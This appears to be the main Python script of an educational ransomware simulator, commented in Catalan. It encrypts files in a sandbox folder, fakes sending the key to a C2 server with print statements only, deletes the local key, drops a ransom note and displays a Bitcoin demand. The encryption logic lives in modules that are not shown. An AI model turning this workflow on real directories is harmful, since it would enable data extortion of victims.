import os
import tkinter
import file_manager                 
import crypto_engine
import config 


# --- CONFIGURACIO I CONSTANTS ---
PROHIBITED_WHITELIST = [".py", ".key", ".exe", ".dll", ".sys", ".locked", ".ini", ".lnk", ".bat", ".dat"]



def simular_exfiltracio_clau() -> None:
#Simula l'enviament de la clau a un servidor C2 remot
    print("\n" + "-"*40)
    print("[CONNEXIO] Connectant amb el servidor C2...")
    print("[INFO] Enviant clau de xifratge de forma segura...")
    file_manager.registrar_log("CLAU EXFILTRADA AL SERVIDOR EXTERN", "CRITICAL")
    print("[V] CLAU ENVIADA. Copia de seguretat eliminada del control de l usuari.")
    print("-"*40)

def mostrar_menu():             
#Loop principal on s'integra tot el codi
    file_manager.registrar_log("SESSIO INICIADA AL SIMULADOR", "INFO")   

    while True:
        print("\n" + "=" * 32)
        print("    SIMULADOR DE RANSOMWARE")    
        print("=" * 32)
        print(f"Zona Objectiu: {config.SAND_DIR}")
        print("-" * 32)
        print("1. Infectar (Xifrar)")          
        print("2. Recuperar (Desxifrar)")       
        print("3. Veure historial (Logs)")      
        print("4. Sortir")                      
        
        opcio = input("\nTria una opcio (1-4): ")        
        
        if opcio == "1":
            file_manager.registrar_log("INICIANT INFECCIO", "INFO",{"target_dir": config.SAND_DIR})
            
            total_xifrats = 0
            total_errors = 0

            if not os.path.exists(config.SAND_DIR):
                print(f"[X] ERROR: NO EXISTEIX EL FOLDER SANDBOX: {config.SAND_DIR}")
                os.makedirs(config.SAND_DIR, exist_ok=True)
                print("[i] S'ha creat la carpeta buida. Posa-hi fitxers per xifrar.")
                continue
                
            # Generacio i Exfiltracio (SDR-16)
            print("\n[+] GENERANT ALGORITME DE SEGURETAT...")
            crypto_engine.generar_i_guardar_clau(config.FILE_KEY)
            simular_exfiltracio_clau()
            
            clau = crypto_engine.carregar_clau(config.FILE_KEY)
            llista_arxius = file_manager.llistar_fitxers(config.SAND_DIR)

            for ruta_completa in llista_arxius:
                # SDR-24: Filtre de carpeta per no xifrar el propi codi
                carpeta_fitxer = os.path.dirname(os.path.abspath(ruta_completa))
                if config.CURR_DIR in carpeta_fitxer:
                    continue

                # Filtre de extensions
                nom_arxiu, extensio = os.path.splitext(ruta_completa)
                if extensio.lower() in PROHIBITED_WHITELIST:
                    continue
                try:
                    resultat = crypto_engine.xifrar_arxiu(ruta_completa, clau)
                    if resultat:
                        total_xifrats += 1
                        file_manager.registrar_log("FITXER_ENCRIPTAT", "INFO", {"path": ruta_completa})
                    else:
                        total_errors += 1
                        file_manager.registrar_log("ERROR_ENCRIPTAT", "ERROR", {"path": ruta_completa})
                except Exception as error:
                    total_errors += 1
                    file_manager.registrar_log("ERROR_BUCLE_ENCRIPTACIO", "CRITICAL", {
                        "path": ruta_completa,
                        "error_msg": str(error)
                    })
            file_manager.registrar_log("FINAL_INFECCIO", "INFO", {
                "total_success": total_xifrats,
                "total_fails": total_errors
            })

            file_manager.generar_nota_rescat(config.SAND_DIR)

            # SDR-16: Autodestruccio de la clau local
            if os.path.exists(config.FILE_KEY):
                os.remove(config.FILE_KEY)
                print("\n[!] ATENCIO: Clau local destruida per seguretat.")
                file_manager.registrar_log("CLAU LOCAL ELIMINADA", "CRITICAL")
            
            print(f"\n[V] INFECCIO COMPLETADA A {config.SAND_DIR}")

        elif opcio == "2":
            clau = crypto_engine.carregar_clau(config.FILE_KEY)
            
            if not clau:
                # SDR-16: El missatge de rescat si no hi ha clau
                print("\n" + "!" * 40)
                print("!!  SISTEMA DE RECUPERACIO BLOQUEJAT  !!")
                print(f"No s ha trobat la clau a: {config.FILE_KEY}")
                print("Rescat: Envia 0.5 BTC a l adreca del servidor C2.")
                print("!" * 40)
                file_manager.registrar_log("INTENT DE RECUPERACIO SENSE CLAU", "WARNING")
                continue

            # Recuperacio si tenim la clau manualment
            llista_arxius = file_manager.llistar_fitxers(config.SAND_DIR)
            arxius_recuperats = 0
            arxius_error = 0
            total_detectats = 0

            for ruta_completa in llista_arxius:
                if ruta_completa.endswith(".locked"):
                    total_detectats += 1
                    resultat = crypto_engine.desxifrar_arxiu(ruta_completa, clau)
                    if resultat:
                        arxius_recuperats += 1
                        file_manager.registrar_log("FITXER_DESXIFRAT", "INFO", {"path": ruta_completa})
                    else:
                        arxius_error += 1
                        file_manager.registrar_log("ERROR_DESXIFRAT", "ERROR", {"path": ruta_completa})


            missatge_final = (
                "FI RECUPERACIO. "
                f"Detectats: {total_detectats} | "
                f"Èxits: {arxius_recuperats} | "
                f"Errors: {arxius_error}"
            )
            nivell_final = "INFO" if arxius_error == 0 else "WARNING"
            file_manager.registrar_log(missatge_final, nivell_final)

        elif opcio == "3":
            # SDR-20 / UX: Llegir logs directament
            file_manager.llegir_logs()
            input("Prem Enter per tornar al menu...")
            
        elif opcio == "4":
            print("Sortint del simulador...")
            break

if __name__ == "__main__":
    mostrar_menu()

